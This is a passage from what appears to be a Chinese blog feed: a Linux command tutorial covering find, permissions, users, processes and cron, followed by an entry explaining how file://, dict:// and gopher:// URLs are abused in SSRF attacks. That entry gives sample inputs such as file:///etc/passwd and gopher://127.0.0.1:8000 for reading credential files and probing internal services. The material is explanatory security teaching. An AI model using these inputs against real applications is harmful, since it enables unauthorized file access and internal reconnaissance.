#分钟<br>-mmin<br>-cmin<br>[root@localhost ~]# find &#x2F;opt -mtime +5  #修改时间5天之前<br>[root@localhost ~]# find &#x2F;opt -atime -1  #访问时间1天之内<br>[root@localhost ~]# find . -amin +1    #访问时间在1分钟之前<br>-type : 按文件类型查找<br>-type f:普通文件<br>-type l:链接文件<br>-type d:目录文件<br>-type b:设备文件<br>[root@localhost ~]# find &#x2F;dev -type f<br>-perm : 按文件权限<br>[root@localhost ~]# find . -perm 644     #查找当前目录下权限是644的文件或目录<br>[root@localhost ~]# find &#x2F;usr&#x2F;bin -perm -4000 #包含set uid<br>-exec&#x2F;xargs : 参数传递<br>-exec:参数是一个一个传递的，传递一个参数执行一次命令。<br>[root@localhost ~]# find &#x2F;etc -name “ifcfg*” -exec cp -rf {} &#x2F;tmp ;   #exec命令查找带ifcfg开头的文件复制到tmp下<br>[root@localhost ~]# find &#x2F;home&#x2F; -name test* -exec tar cvzf test.tar.gz {} ; #由于-exec是一次一次执行，所以会产生覆盖导致最终只会产生一个tar.gz文件，故需要将 “;” 改成 “+;”<br>xargs:将前一个命令的标准输出传递给下一个命令，作为它的参数转换成下一个命令的参数列表。<br>[root@localhost ~]# find &#x2F;home&#x2F; -name “test*” | xargs -i cp {} &#x2F;tmp&#x2F; #找到之后删除处理xargs 参数传递<br>区别：<br>1、exec每处理一个文件或者目录，它都需要启动一次命令，效率不好;<br>2、xargs不能操作文件名有空格的文件；</p><hr><p>ping : 检查主机是否可以联网<br>[root@linux-server ~]# ping <a class="link"   href="http://www.baidu.com/" >www.baidu.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> #ping命令，可以检查主机是否可以联网<br>PING <a class="link"   href="http://www.a.shifen.com/" >www.a.shifen.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> (183.232.231.174) 56(84) bytes of data.<br>​<br>[root@linux-server ~]# ping -c 3 <a class="link"   href="http://www.baidu.com/" >www.baidu.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>-c：指定次数<br>ntp ：实现服务器对时<br>[root@localhost ~]# yum install ntp<br>[root@localhost ~]# ntpdate ntp.aliyun.com<br>[root@localhost ~]# ntpdate cn.pool.ntp.org #cn.pool.ntp.org是ntp网络授时组织的中国授时源</p><hr><p>which ：查找命令<br>[root@localhost ~]# which cd<br>&#x2F;usr&#x2F;bin&#x2F;cd</p><hr><p>查看文件内容<br>cat：查看一个文件的全部内容<br>cat -n : 显示行号<br>cat -A : 显示控制字符</p><hr><p>head ：头部<br>[root@linux-server ~]# head &#x2F;etc&#x2F;passwd &#x2F;&#x2F;默认查看前十行<br>[root@linux-server ~]# head -2 &#x2F;etc&#x2F;passwd &#x2F;&#x2F;查看前两行<br>tail ：尾部<br>[root@linux-server ~]# tail &#x2F;etc&#x2F;passwd &#x2F;&#x2F;默认查看文件的后十行<br>[root@linux-server ~]# tail -1 &#x2F;etc&#x2F;passwd &#x2F;&#x2F;查看文件最后一行<br>[root@linux-server ~]# tail &#x2F;var&#x2F;log&#x2F;messages<br>[root@linux-server ~]# tail -f &#x2F;var&#x2F;log&#x2F;secure &#x2F;&#x2F;-f 动态查看文件的尾部<br>[root@linux-server ~]# tailf &#x2F;var&#x2F;log&#x2F;secure &#x2F;&#x2F;功能同上</p><hr><p>grep：过滤关键字<br>过滤文件中带有root的内容：<br>[root@linux-server ~]# grep ‘root’ &#x2F;etc&#x2F;passwd<br>过滤以root开头的行：^ –以什么开头<br>[root@linux-server ~]# grep ‘^root’ &#x2F;etc&#x2F;passwd<br>过滤以bash结尾的行：$ –以什么结尾<br>[root@linux-server ~]# grep ‘bash$’ &#x2F;etc&#x2F;passwd</p><hr><p>less ：分页显示<br>[root@linux-server ~]# less &#x2F;etc&#x2F;makedumpfile.conf.sample<br>1.空格键是翻页 回车键是翻行<br>2.上下箭头可以来回翻<br>3.&#x2F;关键字  #搜索 (n按关键字往下翻 N按关键字往上翻)<br>4.快捷键:q -quit 退出<br>more ：分页显示文件内容<br>[root@localhost ~]# more 文件名<br>空格键是翻页 回车键是翻行</p><h2 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h2><p>useradd &#x2F; userdel &#x2F; usermod  ： 用户管理<br>-M : 不创建用户主目录<br>-r : 创建系统用户<br>​<br>[root@linux-server ~]# useradd user02 -u 503 &#x2F;&#x2F;指定uid为503<br>[root@linux-server ~]# useradd user05 -s &#x2F;sbin&#x2F;nologin &#x2F;&#x2F;创建用户并指定shell<br>[root@linux-server ~]# useradd user07 -G it,fd &#x2F;&#x2F;创建用户，指定附加组<br>[root@linux-server ~]# useradd -g 1003 user8 #指定用户的主属组为1003组。<br>[root@linux-server ~]# useradd user10 -u 4000 -s &#x2F;sbin&#x2F;nologin<br>userdel -r ：完全删除用户</p><p>1.修改用户名：<br>-l<br>[root@linux-server ~]# usermod -l NEW_name user8<br>[root@linux-server ~]# id user8<br>id: user8：无此用户</p><p>2.修改GID：<br>-g<br>[root@linux-server ~]# id user10<br>uid&#x3D;1000(user10) gid&#x3D;1000(tom) groups&#x3D;1000(tom)<br>[root@linux-server ~]# usermod user10 -g new_gid #gid需要提前存在</p><p>3.修改UID<br>-u<br>[root@linux-server ~]# usermod -u new_id jack<br>[root@linux-server ~]# id jack<br>uid&#x3D;1005(jack) gid&#x3D;1004(jack) groups&#x3D;1004(jack)</p><p>4.修改用户的登录shell<br>-s<br>[root@linux-server ~]# usermod -s &#x2F;sbin&#x2F;nologin user07 #修改用户的登录shell<br>groupadd &#x2F; groupmod &#x2F; groupdel：组管理<br>[root@linux-server ~]# groupadd hr &#x2F;&#x2F;创建一个用户组叫hr<br>[root@linux-server ~]# groupadd net01 -g 2000 &#x2F;&#x2F;创建组叫net01，并指定gid为2000<br>[root@linux-server ~]# grep ‘net01’ &#x2F;etc&#x2F;group &#x2F;&#x2F;查看&#x2F;etc&#x2F;group中组net01信息<br>net01:x:2000:<br>[root@linux-server ~]#groupmod 参数 组名<br>-g：修改组的gid<br>-n：修改组名<br>[root@linux-server ~]#groupmod -g 2000 grp1<br>[root@linux-server ~]#groupmod -n 新组名 grp1<br>[root@linux-server ~]# groupdel net01 #删除组net01<br>注意：用户的主属组不能删除<br>gpasswd : 组成员管理<br>注意：只针对已存在的用户</p><hr><p>1.给组添加账户<br>-a<br>[root@linux-server ~]# gpasswd -a user10 grp2<br>Adding user user10 to group grp2<br>2.同时添加多个用户到组<br>-M:members成员的缩写<br>[root@linux-server ~]# gpasswd -M tom,alice it （<strong>会覆盖该组之前的组成员</strong>）<br>3.从组删除用户<br>-d<br>[root@linux-server ~]# gpasswd -d user07 hr</p><h2 id="权限管理"><a href="#权限管理" class="headerlink" title="权限管理"></a>权限管理</h2><p>chown:改变文件或目录的所属主以及所属组<br>chown :（chown 属主.属组 文件名）<br>​<br>[root@linux-server ~]# chown alice.hr file1.txt &#x2F;&#x2F;修改属主、属组<br>[root@linux-server ~]# chown tom file1.txt &#x2F;&#x2F;修改属主<br>[root@linux-server ~]# chown .it file1.txt &#x2F;&#x2F;只改属组<br>​<br>[root@linux-server ~]# chown -R alice.hr dir1 &#x2F;&#x2F;递归修改—针对目录<br>chmod : 更改权限<br>基本权限类型：<br>读 ：r —-&gt; 4<br>写 ：w —-&gt; 2<br>执行: x(exec) —–&gt; 1<br>​<br>[root@linux-server ~]# chmod -R a&#x3D;rwx dir1 &#x2F;&#x2F;递归更改目录及其中文件的权限</p><p>a. 使用符号*<br>​[root@linux-server ~]# chmod u+x file1.txt  &#x2F;&#x2F;属主增加执行<br>[root@linux-server ~]# chmod a&#x3D;rwx file1.txt &#x2F;&#x2F;所有人等于读写执行<br>[root@linux-server ~]# chmod a&#x3D;- file1.txt &#x2F;&#x2F;所有人都没有权限<br>[root@linux-server ~]# chmod ug&#x3D;rw,o&#x3D;r file1.txt &#x2F;&#x2F;属主属组等于读写，其他人只读<br>[root@linux-server ~]# ll<br>-rw-rw-r–. 1 tom it  0 Nov 1 15:30 file1.txt</p><p>b.使用数字*<br>​[root@linux-server ~]# chmod 644 file1.txt<br>[root@linux-server ~]# ll file1.txt<br>-rw-r–r–. 1 tom it 0 Nov 1 15:30 file1.txt<br>​<br>[root@linux-server ~]# chmod 755 file1.txt<br>[root@linux-server ~]# ll<br>-rwxr-xr-x 1 root root 0 Jul 23 22:40 file1.txt<br>​<br>[root@linux-server ~]# chmod 521 file1.txt<br>[root@linux-server ~]# ll<br>-r-x-w—x 1 root root 0 Jul 23 22:40 file1.txt</p><hr><p>chgrp : 更改属组<br>[root@linux-server ~]# chgrp hr file1.txt &#x2F;&#x2F;更改文件file1.txt所属组为hr<br>​<br>[root@linux-server ~]# chgrp -R hr dir1 &#x2F;&#x2F;递归更改目录dir1及其中文件所属组为hr </p><hr><p>ACL权限<br>getfacl ：查看文件或目录当前设定的 ACL 权限信息<br>[root@localhost ~]# getfacl 文件名<br>setfacl ：直接设定用户或群组对指定文件的访问权限<br>setfacl -m：给用户或群组添加 ACL 权限<br>chattr：文件隐藏属性</p><hr><p>[root@linux-server ~]# touch file1 file2 file3<br>1.查看文件属性<br>[root@linux-server ~]# lsattr file1 file2 file3  #查看文件隐藏属性<br>—————- file1<br>—————- file2<br>—————- file3<br>2.设置权限<br>[root@linux-server ~]# chattr +a file1 #不允许修改，只允许追加<br>[root@linux-server ~]# chattr +i file2 #不允许做任何操作<br>[root@linux-server ~]# chattr +A file3<br>[root@linux-server ~]# lsattr file1 file2 file3<br>—–a———- file1<br>—-i———– file2<br>——-A——– file3<br>​<br>i:即Immutable，系统不允许对这个文件进行任何的修改<br>a：即Append Only，系统只允许在这个文件之后追加数据，不允许任何覆盖或截断这个文件<br>A：即Atime，告诉系统不要修改对这个文件的最后访问时间<br>​<br>取消权限<br>[root@linux-server ~]# chattr -a file1<br>[root@linux-server ~]# chattr -i file2<br>管道与重定向<br>awk：过滤并输出文件中符合条件的内容<br>awk -F “分隔符” ‘{print $第几列}’<br>[root@localhost ~]# cat &#x2F;home&#x2F;aaa<br>sdjlasjlk<br>asldjasjlkdasjl<br>[root@localhost ~]# grep ‘sd’ &#x2F;home&#x2F;aaa | awk -F “j” ‘{print $2}’ #过滤aaa中的一行内容然后将结果通过管道传递给                  awk，过滤并输出以j为分隔符的第二列内容<br>las<br>sort: 排序<br>[<a class="link"   href="mailto:&#114;&#x6f;&#111;&#116;&#64;&#113;&#102;&#101;&#100;&#117;&#x2e;&#99;&#111;&#109;" >&#114;&#x6f;&#111;&#116;&#64;&#113;&#102;&#101;&#100;&#117;&#x2e;&#99;&#111;&#109; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ~]# sort -t”:” -k3 -n &#x2F;etc&#x2F;passwd #以: 分隔，将第三列按字数升序<br>[<a class="link"   href="mailto:&#x72;&#111;&#x6f;&#116;&#64;&#x71;&#x66;&#101;&#100;&#117;&#46;&#99;&#x6f;&#109;" >&#x72;&#111;&#x6f;&#116;&#64;&#x71;&#x66;&#101;&#100;&#117;&#46;&#99;&#x6f;&#109; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ~]# sort -t”:” -k3 -n &#x2F;etc&#x2F;passwd -r #以: 分隔，将第三列按字数降序<br>[<a class="link"   href="mailto:&#114;&#111;&#111;&#116;&#64;&#113;&#x66;&#101;&#x64;&#117;&#46;&#99;&#111;&#109;" >&#114;&#111;&#111;&#116;&#64;&#113;&#x66;&#101;&#x64;&#117;&#46;&#99;&#111;&#109; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ~]# sort -t”:” -k3 -n &#x2F;etc&#x2F;passwd |head #以: 分隔，将第三列按字数升序看前十行<br>[<a class="link"   href="mailto:&#x72;&#x6f;&#111;&#116;&#x40;&#x71;&#x66;&#101;&#100;&#117;&#x2e;&#99;&#x6f;&#x6d;" >&#x72;&#x6f;&#111;&#116;&#x40;&#x71;&#x66;&#101;&#100;&#117;&#x2e;&#99;&#x6f;&#x6d; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ~]# sort -t”:” -k3 -n &#x2F;etc&#x2F;passwd |tail #以: 分隔，将第三列按字数升序看后十行<br>参数详解：<br>sort 排序，默认升序<br>-t 指定分隔符<br>-k 指定列<br>-n 按数值<br>-r 降序<br>head 默认输出前十行<br>tail 默认输出后十行<br>xargs：参数传递<br>对与 ls cp rm mv命令，管道不能执行。所以通过xargs实现。<br>​<br> 语法:<br> cat a.txt | xargs -i cp {} &#x2F;目录<br> {}:前面传过来的内容<br> -i ：为了让大括号生效<br> 目录时 -r<br> 解释：前面传过来的东西交给大括号</p><p> cat file.txt |xargs ls -l<br> 前面是目录或者目录的路径。 ls - l 后面可以不加大括号，直接执行。</p><p>[<a class="link"   href="mailto:&#x72;&#111;&#111;&#x74;&#x40;&#x71;&#x66;&#x65;&#x64;&#117;&#46;&#x63;&#111;&#109;" >&#x72;&#111;&#111;&#x74;&#x40;&#x71;&#x66;&#x65;&#x64;&#117;&#46;&#x63;&#111;&#109; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ~]# touch &#x2F;home&#x2F;file{1..5}<br>[<a class="link"   href="mailto:&#x72;&#x6f;&#x6f;&#116;&#64;&#x71;&#102;&#x65;&#100;&#x75;&#46;&#99;&#x6f;&#109;" >&#x72;&#x6f;&#x6f;&#116;&#64;&#x71;&#102;&#x65;&#100;&#x75;&#46;&#99;&#x6f;&#109; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ~]# # cat files.txt | xargs -i cp -rvf {} &#x2F;tmp&#x2F;<br>‘&#x2F;home&#x2F;file1’ -&gt; ‘&#x2F;tmp&#x2F;file1’<br>‘&#x2F;home&#x2F;file2’ -&gt; ‘&#x2F;tmp&#x2F;file2’<br>‘&#x2F;home&#x2F;file3’ -&gt; ‘&#x2F;tmp&#x2F;file3’<br>‘&#x2F;home&#x2F;file4’ -&gt; ‘&#x2F;tmp&#x2F;file4’<br>‘&#x2F;home&#x2F;file5’ -&gt; ‘&#x2F;tmp&#x2F;file5’</p><h2 id="软件管理"><a href="#软件管理" class="headerlink" title="软件管理"></a>软件管理</h2><p>rpm：管理软件<br>rpm -ivh 软件包：安装软件<br>-i install 安装<br>-vh verbose human 人性化显示安装过程<br>-u upgrade 升级<br>rpm -q{a,l,f} 软件包：查询<br>＝＝查询<br>(从本地的rpm数据库)<br>-q query （查询）<br>-l list （列出）<br>-f file<br>-a all<br>rpm -ql 软件包名 ：列出某个软件包安装后，生成了哪些文件以及文件对应的存储位置<br>​<br>[root@linux-server ~]# rpm -qa | grep 软件名 # 查找软件是否安装<br>[root@linux-server ~]# rpm -ql httpd     #查询http安装的文件<br>[root@linux-server ~]# rpm -qf &#x2F;usr&#x2F;share&#x2F;httpd&#x2F;noindex  #查询该文件属于哪个包，只能查询已经安装好的软件<br>rpm -e：删除软件<br>语法：# rpm -e 软件名称<br>-e erase的意思<br>[root@linux-server ~]# rpm -e httpd<br>yum：管理软件<br>清理yum缓存:（元数据建立）<br>yum clean all</p><p>缓存软件包信息:<br> 提高搜索&#x2F;安装软件的速度<br>yum makecache<br>查询yum源信息:  #也具有缓存功能<br>yum repolist </p><p>查看命令属于哪个软件<br>yum provides rz </p><p>查看系统已经安装好的软件和没有安装的软件（源里存在即可查到）:<br>yum list</p><p>安装软件:<br>yum install 软件名称 </p><h2 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h2><p>ps aux&#x2F;ps -ef：静态查看进程<br>[root@linux-server ~]# ps aux </p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">USER   PID %CPU %MEM VSZ RSS TTY  STAT START TIME COMMAND</span><br><span class="line">============================================================================</span><br></pre></td></tr></table></figure></div><p>USER:  #运行进程的用户<br>PID： #进程ID<br>%CPU: #CPU占用率<br>%MEM: #内存占用率<br>VSZ  进程占用的虚拟内存大小 ，一般以B为单位<br>RSS  占用的物理内存大小<br>TTY  终端 （？表示不占用终端） （? 表示没有占用终端）<br>STAT： #进程状态 —了解<br>START: #进程的启动时间<br>TIME： #进程占用CPU的总时间<br>COMMAND： #进程文件，进程名<br>[root@linux-server ~]# ps aux | less<br>参数解释：<br>ps :process nsapashot<br>a 只能查看系统里面运行的所有终端进程<br>u 显示进程拥有者<br>x 显示系统内所有进程<br>f 显示进程之间的父子关系<br>[root@linux-server ~]# ps -ef<br>参数解释：<br>-e 显示所有进程<br>-l 长格式显示<br>-f 完整格式<br>cat … ：查看单个PID<br>[root@linux-server ~]# systemctl start httpd #启动<br>[root@linux-server ~]# cat &#x2F;var&#x2F;run&#x2F;httpd&#x2F;httpd.pid<br>1043<br>ps aux | grep ‘进程名’：查看指定PID<br>[root@linux-server ~]# ps aux | grep sshd<br>root       1043  0.0  0.2 105996  4120 ?        Ss   01:32   0:00 &#x2F;usr&#x2F;sbin&#x2F;sshd -D</p><hr><p>netstat -tlanp：查看端口<br>ip地址： 为了确定一个服务器在互联网的位置<br>服务端口： 为了确定一个服务在服务器中位置<br>#查网络进程和正在监听的端口<br>[root@linux-server ~]# netstat -tlanp    (该命令对应的包名：net-tools)<br>参数详解：<br>-a  显示全部的进程<br>-u  显示udp<br>-n  以数字的新式显示协议名称<br>-t   tcp<br>-p：显示进程的名称和pid<br>-l :只显示正在被监听的端口</p><p>[root@localhost ~]# netstat -alntp | grep ‘sshd’（可跟端口号&#x2F;进程名&#x2F;PID）       ##可查看到sshd服务的端口号是22<br>tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1106&#x2F;sshd<br>tcp        0      0 192.168.201.142:22      192.168.201.1:10025     ESTABLISHED 17303&#x2F;sshd: root@no<br>tcp        0      0 192.168.201.142:22      192.168.201.1:10024     ESTABLISHED 17034&#x2F;sshd: root@no<br>tcp      104      0 192.168.201.142:22      192.168.201.1:9813      ESTABLISHED 1820&#x2F;sshd: root@pts<br>tcp6       0      0 :::22                   :::*                    LISTEN      1106&#x2F;sshd<br>lsof -i:端口号  ：根据端口号查询进程<br>[root@linux-server ~]# yum install lsof  #安装软件包<br>[root@linux-server ~]# lsof -i:80   #端口号，这能查看带端口的进程<br>COMMAND   PID   USER   FD   TYPE  DEVICE SIZE&#x2F;OFF NODE NAME<br>httpd   64249   root    4u  IPv6 1373628      0t0  TCP *:http (LISTEN)<br>top：动态查看进程<br>[root@linux-server ~]# top  #动态显示信息，三秒刷新一次。</p><hr><p>kill&#x2F;pkill：进程控制<br>kill,pkill<br>语法： kill 信号 PID   #信号也是进程间通信的一种方式<br>     pkill 信号 进程名<br>[root@linux-server ~]# kill -l   #查看所有信号<br>-1   HUP  重新加载进程或者重新加载配置文件,PID不变<br>-9   KILL 强制杀死<br>-15  TERM 正常杀死(这个信号可以默认不写)<br>-18  CONT 激活进程<br>-19  STOP 挂起进程</p><p>进程状态解释–了解：<br>+：表示运行在前台的进程组<br>S+：休眠状态<br>T+：暂停，挂起状态<br>s：父进程<br>jobs：作业控制<br>sleep 工作号 &amp; :让命令或程序后台运行<br>sleep 工作号 #ctrl Z   :把程序从前台放到后台并暂停<br>jobs   :查看后台工作号<br>bg %工作序号    :让暂停的程序在后台运行<br>fg %工作序号   :将后台的程序调到前台</p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>uptime : 查看当前CPU负载<br>free -m : 查看内存使用情况<br>查看系统版本和内核<br>[root@linux-server ~]# cat &#x2F;etc&#x2F;redhat-release  #查看版本<br>CentOS Linux release 7.4.1708 (Core)<br>[root@linux-server ~]# uname -a #看查正在运行的内核版本<br>Linux linux-server 3.10.0-693.el7.x86_64 #1 SMP Tue Aug 22 21:09:27 UTC 2017 x86_64 x86_64 x86_64 GNU&#x2F;Linux<br>[root@linux-server ~]# uname -r  #查看内核版本<br>3.10.0-693.el7.x86_64<br>修改主机名<br>[root@linux-server ~]# hostnamectl set-hostname  xxxx   #主机名，修改完之后断开与终端连接，然后在重新连接即可。<br>查看主机名<br>[root@linux-server ~]# hostname</p><p>vim &#x2F;etc&#x2F;hostname   #直接更改hostname，然后reboot重启<br>lrzsz : 上传下载<br>yum install -y lrzsz<br>上传<br>rz<br>下载<br>sz 文件</p><h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h2><p>at : 一次调度执行<br>at使用规则<br>[root@linux-server ~ ]# yum -y install at<br>[root@linux-server ~ ]# systemctl status atd    #查看启动状态<br>[root@linux-server ~ ]# systemctl start atd#首先要启动服务<br>方式一：<br>[root@linux-server ~ ]# at now +1min    #一分钟后开始执行<br>at&gt; useradd uuuu<br>at&gt; <EOT>     #Ctrl+D<br>job 1 at Sat Mar 21 22:34:00 2015<br>方式二：<br>[root@linux-server ~ ]# vim at.jobs<br>useradd u99<br>[root@linux-server ~ ]# at 20:33 &lt; at.jobs   #在20：33执行计划任务</p><p>at是以输入重定向方式将文件中的内容输入给at调度执行任务，所以不需要执行文件，即不需要给予执行权限。<br>atq : 查看一次性计划任务<br>2Tue Aug  9 14:29:00 2022 a root<br>atrm : 删除一次性计划任务</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># atrm  计划任务序号</span><br></pre></td></tr></table></figure></div><p>cron ：循环调度执行  用户级<br>crontab -l&#x2F;&#x2F;列出当前用户的计划任务<br>crontab -r&#x2F;&#x2F;删除当前用户所有的计划任务<br>crontab -e&#x2F;&#x2F;编辑当前用户的计划任务<br>crontab -u username     &#x2F;&#x2F;（仅管理员可使用）管理其他用户的计划任务</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="linux" scheme="http://example.com/categories/linux/"/>
    
    
    <category term="linux" scheme="http://example.com/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>常见的php伪协议</title>
    <link href="http://example.com/2025/01/02/web/ssrf/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <id>http://example.com/2025/01/02/web/ssrf/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</id>
    <published>2025-01-02T13:10:52.000Z</published>
    <updated>2025-03-04T10:38:46.835Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="1-file-x2F-x2F-协议"><a href="#1-file-x2F-x2F-协议" class="headerlink" title="1. file:&#x2F;&#x2F; 协议"></a>1. <strong>file:&#x2F;&#x2F; 协议</strong></h3><h4 id="概述："><a href="#概述：" class="headerlink" title="概述："></a><strong>概述</strong>：</h4><p><code>file://</code> 是一种用于访问本地文件系统的协议。在 URL 中，它指示访问本地计算机的文件。例如：</p><ul><li><code>file:///etc/passwd</code>（Linux系统中）</li><li><code>file:///C:/Windows/System32/drivers/etc/hosts</code>（Windows系统中）</li></ul><p>它是一个用于本地文件的 URI 协议，表示在本地计算机上读取文件的路径。</p><h4 id="常见用途："><a href="#常见用途：" class="headerlink" title="常见用途："></a><strong>常见用途</strong>：</h4><ul><li><strong>文件访问</strong>：它允许直接访问本地文件系统中的文件。这个协议通常用于 Web 浏览器中查看本地文件。</li><li><strong>浏览器功能</strong>：某些浏览器允许用户输入 <code>file://</code> URL 来查看本地文件，而不通过HTTP或FTP。</li></ul><h4 id="攻击场景："><a href="#攻击场景：" class="headerlink" title="攻击场景："></a><strong>攻击场景</strong>：</h4><p>如果 Web 应用没有正确验证和过滤用户输入，攻击者可能构造类似于 <code>file://</code> 的路径来访问本地敏感文件。典型攻击案例包括：</p><ul><li><strong>读取敏感文件</strong>：攻击者可以提交类似 <code>file:///etc/passwd</code>（Linux）或 <code>file:///C:/Windows/System32/config/systemprofile</code>（Windows）这样的路径来读取本地敏感文件。</li><li><strong>SSRF（Server-Side Request Forgery）攻击</strong>：攻击者通过利用 SSRF 漏洞，将服务器请求引导到本地文件系统，读取服务器上的敏感数据，如 <code>/etc/shadow</code>、数据库配置文件等。</li></ul><hr><h3 id="2-dict-x2F-x2F-协议"><a href="#2-dict-x2F-x2F-协议" class="headerlink" title="2. dict:&#x2F;&#x2F; 协议"></a>2. <strong>dict:&#x2F;&#x2F; 协议</strong></h3><h4 id="概述：-1"><a href="#概述：-1" class="headerlink" title="概述："></a><strong>概述</strong>：</h4><p><code>dict://</code> 协议用于连接到 <strong>Dictionary Protocol</strong> 服务。字典协议（DICT）是一种用于访问在线字典的协议，它允许客户端通过互联网查询词汇定义。<code>dict://</code> 协议的 URL 通常用于指示一个字典服务器和要查询的词条。例如：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">dict://dict.org/merriam-webster/word</span><br></pre></td></tr></table></figure></div><p>此 URL 会请求连接到 <code>dict.org</code> 的字典服务，并查询 <code>merriam-webster</code> 词条下的 <code>word</code> 内容。</p><h4 id="常见用途：-1"><a href="#常见用途：-1" class="headerlink" title="常见用途："></a><strong>常见用途</strong>：</h4><ul><li><strong>字典查询</strong>：用户可以通过 <code>dict://</code> 协议访问各种公共或私人的字典服务器，获取词汇和术语的定义。</li><li><strong>教育和参考</strong>：这种协议可以用于访问科学、技术和文学领域的专业词汇。</li></ul><h4 id="攻击场景：-1"><a href="#攻击场景：-1" class="headerlink" title="攻击场景："></a><strong>攻击场景</strong>：</h4><p>虽然 <code>dict://</code> 协议本身并不会直接引发严重的安全问题，但如果 Web 应用错误地处理它，可能会导致一些间接的攻击机会。例如：</p><ul><li><strong>SSR攻击</strong>：攻击者如果能够控制 Web 应用输入的 URL，可能诱使应用通过 <code>dict://</code> 协议访问敏感内网资源（比如某些内部字典服务或数据库），从而泄露数据。</li><li><strong>暴露内部字典服务</strong>：某些应用可能通过 <code>dict://</code> 协议连接到内部的字典服务，如果攻击者可以操控输入，可能会导致未授权的服务访问，进而泄露信息。</li></ul><hr><h3 id="3-gopher-x2F-x2F-协议"><a href="#3-gopher-x2F-x2F-协议" class="headerlink" title="3. gopher:&#x2F;&#x2F; 协议"></a>3. <strong>gopher:&#x2F;&#x2F; 协议</strong></h3><h4 id="概述：-2"><a href="#概述：-2" class="headerlink" title="概述："></a><strong>概述</strong>：</h4><p><code>gopher://</code> 协议源自早期的互联网协议 Gopher，它是一种用于信息检索的协议，允许用户通过结构化的层次目录访问信息。虽然 Gopher 协议已经过时，但仍然存在一些遗留的 Gopher 服务器，供用户访问文件、文档等信息。</p><p>例如：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">gopher://gopher.floodgap.com/1/0/1/textfile.txt</span><br></pre></td></tr></table></figure></div><p>这将连接到一个 Gopher 服务器，下载 <code>textfile.txt</code> 文件。</p><h4 id="常见用途：-2"><a href="#常见用途：-2" class="headerlink" title="常见用途："></a><strong>常见用途</strong>：</h4><ul><li><strong>信息检索</strong>：Gopher 协议原本用于提供结构化的文本和信息检索，类似于早期的网络搜索引擎。</li><li><strong>教育和档案</strong>：一些旧的 Gopher 服务仍然在使用，用于存档资料或作为怀旧用途。</li></ul><h4 id="攻击场景：-2"><a href="#攻击场景：-2" class="headerlink" title="攻击场景："></a><strong>攻击场景</strong>：</h4><p>与 <code>file://</code> 和 <code>dict://</code> 协议相比，<code>gopher://</code> 协议的安全问题更加隐蔽，可能会被错误地使用或滥用。攻击者可以利用 SSRF 漏洞通过 <code>gopher://</code> 协议发起请求，尝试访问内网服务或获取信息。例如：</p><ul><li><strong>内部服务扫描</strong>：攻击者可以通过 Gopher 协议扫描目标 Web 应用所在网络中的内网服务。例如，可以利用 <code>gopher://127.0.0.1:8000</code> 来访问内网服务。</li><li><strong>信息泄露</strong>：攻击者可能通过 Gopher 协议访问目标服务器的未授权端口，泄露敏感的内部信息。</li></ul><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="SSRF" scheme="http://example.com/categories/SSRF/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="php伪协议" scheme="http://example.com/tags/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    
  </entry>
  
  <entry>
    <title>SSRF简介</title>
    <link href="http://example.com/2025/01/02/web/ssrf/%E7%AE%80%E4%BB%8B/"/>
    <id>http://example.com/2025/01/02/web/ssrf/%E7%AE%80%E4%BB%8B/</id>
    <published>2025-01-02T13:10:52.000Z</published>
    <updated>2025-03-04T10:38:46.836Z</updated>
    
